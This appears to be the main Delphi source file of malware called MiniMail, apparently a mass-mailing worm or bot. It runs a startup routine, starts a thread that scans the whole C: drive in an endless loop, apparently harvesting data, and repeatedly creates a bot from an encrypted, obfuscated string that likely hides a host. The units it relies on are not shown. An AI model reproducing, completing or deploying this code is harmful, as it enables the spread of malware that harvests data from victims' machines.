   program MiniMail;

   uses
     Windows,
     MiniMailFunc in 'MiniMailFunc.pas',
     MiniMailGrab in 'MiniMailGrab.pas',
     MiniMailBot in 'MiniMailBot.pas';
   procedure scan;
   begin
     While 1 = 1 do
       DoScan('C:\', '*', '*.*');
   end;
   var
     d: dword;
   begin
     StartUp;
   //  MakeBase64;
     CreateThread(nil, 0, @scan, nil, 0, d);
     While 1 = 1 Do
       CreateBot(EncryptStr('nud)tfcntsndibs)hu`'));
   end.
